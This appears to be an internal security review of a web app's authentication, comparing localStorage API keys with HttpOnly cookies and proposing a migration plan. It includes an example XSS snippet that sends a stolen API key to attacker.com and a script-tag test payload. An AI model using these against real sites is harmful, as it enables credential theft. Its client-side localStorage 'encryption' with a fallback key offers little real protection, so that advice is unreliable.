# Authentication Security Analysis & Recommendations

## Current State Analysis

### Authentication Methods

#### 1. Main Application (Dashboard, Chat, etc.)

- **Method**: API Key stored in localStorage
- **Header**: `X-API-Key`
- **Validation**: Against `API_KEY` environment variable
- **Usage**: All frontend features, external tools

#### 2. Admin Panel

- **Method**: HttpOnly cookie with HMAC token
- **Cookie**: `admin_token`
- **Validation**: Server-side token verification
- **Usage**: Admin dashboard only

## Security Comparison

### localStorage API Keys

**Advantages:**

- ✅ Simple to implement
- ✅ Works with API clients (Postman, curl, n8n)
- ✅ Cross-domain compatible
- ✅ Explicit authentication flow
- ✅ Easy to debug

**Vulnerabilities:**

- ❌ **XSS Attack Risk**: If attacker injects malicious script, they can read API key

  ```javascript
  // Malicious script can do:
  const apiKey = localStorage.getItem('griot_api_key');
  fetch('https://attacker.com/steal', { method: 'POST', body: apiKey });
  ```

- ❌ **Browser Developer Tools**: Users can easily view/copy API key
- ❌ **No automatic expiration**: Keys remain until manually removed

### HttpOnly Cookies (Admin Panel)

**Advantages:**

- ✅ **XSS Protected**: JavaScript cannot access the cookie
- ✅ **Automatic expiration**: Server controls lifetime
- ✅ **Secure flags**: Can enforce HTTPS-only

**Vulnerabilities:**

- ⚠️ **CSRF Risk**: Cookies sent automatically with every request
- ❌ **Complex for API clients**: Harder to use with tools like Postman
- ❌ **Cross-domain issues**: Requires CORS configuration

## Recommendations by Deployment Type

### Development Environment

**Status**: Current implementation is acceptable

```bash
# .env
API_KEY=dev-key-12345
DEBUG=true
```

**Why**: Development prioritizes convenience over security

### Production Environment

**Status**: Requires improvements

#### Recommended: Hybrid Approach

**For Browser Users:**

```typescript
// Option 1: Session-based (more secure)
POST /auth/login
→ Returns HttpOnly cookie
→ All subsequent requests use cookie
→ No localStorage needed

// Option 2: API Key (compatibility)
POST /auth/login
→ Returns short-lived API key
→ Stores in localStorage
→ Requires periodic refresh
```

**For API/MCP Clients:**

```bash
# Long-lived API keys managed separately
curl -H "X-API-Key: api-key-..." https://api.example.com/
```

## Implementation Recommendations

### 1. Immediate Improvements (Current System)

#### Add Security Headers

```python
# app/main.py
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.middleware.cors import CORSMiddleware

# Content Security Policy
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000"
    return response
```

#### API Key Encryption in localStorage

```typescript
// frontend/src/utils/secureStorage.ts
import CryptoJS from 'crypto-js';

const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'fallback-key';

export const secureStorage = {
  setItem: (key: string, value: string) => {
    const encrypted = CryptoJS.AES.encrypt(value, ENCRYPTION_KEY).toString();
    localStorage.setItem(key, encrypted);
  },
  
  getItem: (key: string): string | null => {
    const encrypted = localStorage.getItem(key);
    if (!encrypted) return null;
    
    try {
      const decrypted = CryptoJS.AES.decrypt(encrypted, ENCRYPTION_KEY);
      return decrypted.toString(CryptoJS.enc.Utf8);
    } catch {
      return null;
    }
  },
  
  removeItem: (key: string) => {
    localStorage.removeItem(key);
  }
};
```

#### Rate Limiting

```python
# app/middleware/rate_limit.py
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.get("/api/v1/research/web")
@limiter.limit("10/minute")  # Max 10 requests per minute
async def web_search(...):
    ...
```

### 2. Enhanced Session-Based Auth (Recommended)

```python
# app/routes/auth/auth_v2.py
from datetime import datetime, timedelta
import secrets

# Session storage (use Redis in production)
sessions = {}

@router.post("/auth/login/session")
async def login_with_session(request: LoginRequest):
    # Validate credentials
    if validate_credentials(request.username, request.password):
        # Generate session token
        session_token = secrets.token_urlsafe(32)
        session_id = secrets.token_urlsafe(16)
        
        # Store session (with expiry)
        sessions[session_id] = {
            'token': session_token,
            'user': request.username,
            'expires': datetime.now() + timedelta(hours=24)
        }
        
        response = JSONResponse({'success': True})
        
        # Set HttpOnly cookie
        response.set_cookie(
            'session_id',
            session_id,
            httponly=True,
            secure=True,  # HTTPS only
            samesite='strict',
            max_age=86400  # 24 hours
        )
        
        return response
```

```typescript
// frontend/src/contexts/AuthContext.tsx (Enhanced)
const login = async (username: string, password: string) => {
  const response = await authApiClient.post('/auth/login/session', {
    username,
    password
  });
  
  // Session cookie is set automatically by browser
  // No need to store in localStorage
  if (response.data.success) {
    setIsAuthenticated(true);
  }
};
```

### 3. API Key Management System

```python
# app/models/api_key.py
from datetime import datetime, timedelta
import secrets

class ApiKey:
    def __init__(self, user_id: str, name: str, expires_in_days: int = 30):
        self.id = secrets.token_urlsafe(16)
        self.key = f"griot_{secrets.token_urlsafe(32)}"
        self.user_id = user_id
        self.name = name
        self.created_at = datetime.now()
        self.expires_at = datetime.now() + timedelta(days=expires_in_days)
        self.last_used = None
        self.is_active = True
    
    def is_valid(self) -> bool:
        return (
            self.is_active and 
            datetime.now() < self.expires_at
        )
```

## Migration Strategy

### Phase 1: Add Security Layers (Week 1)

- ✅ Add security headers
- ✅ Implement rate limiting
- ✅ Add API key rotation endpoint
- ✅ Encrypt localStorage values

### Phase 2: Session Support (Week 2)

- ✅ Add session-based auth alongside API key auth
- ✅ Users can choose: API key OR session
- ✅ Maintain backward compatibility

### Phase 3: API Key Management (Week 3)

- ✅ Add API key creation UI
- ✅ Support multiple keys per user
- ✅ Add key expiration
- ✅ Add usage analytics

### Phase 4: Deprecation (Optional, Week 4+)

- ⚠️ Mark localStorage-only auth as legacy
- ✅ Encourage migration to sessions
- ✅ Keep API key support for programmatic access

## Security Checklist

- [ ] **HTTPS Only**: Ensure all production traffic uses HTTPS
- [ ] **Environment Variables**: Never commit `.env` files
- [ ] **API Key Rotation**: Implement key rotation mechanism
- [ ] **Rate Limiting**: Prevent brute force attacks
- [ ] **Input Validation**: Sanitize all user inputs
- [ ] **CSP Headers**: Prevent XSS attacks
- [ ] **CORS Policy**: Restrict allowed origins
- [ ] **Audit Logging**: Log all authentication attempts
- [ ] **Key Expiration**: Set expiration on API keys
- [ ] **Monitoring**: Alert on suspicious activity

## XSS Protection Examples

### Before (Vulnerable)

```typescript
// User input rendered directly
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### After (Protected)

```typescript
// Sanitize user input
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
```

## Testing Security

### Test for XSS

```javascript
// Try injecting this in chat:
<script>alert(localStorage.getItem('griot_api_key'))</script>

// Should be sanitized and not execute
```

### Test Rate Limiting

```bash
# Try making 20 requests in 1 minute
for i in {1..20}; do
  curl -H "X-API-Key: your-key" https://api.example.com/research/web
done

# Should get 429 Too Many Requests after limit
```

### Test Session Expiration

```javascript
// Login and wait 24 hours
// Session should expire and redirect to login
```

## Conclusion

**Current State**: ✅ Acceptable for development, ⚠️ needs improvement for production

**Recommended Action**:

1. **Short-term** (This week): Add security headers and rate limiting
2. **Mid-term** (This month): Implement session-based auth option
3. **Long-term** (This quarter): Full API key management system

**Key Principle**: Security should be layered, not all-or-nothing. Keep what works (API keys for compatibility) while adding more secure options (sessions for browsers).
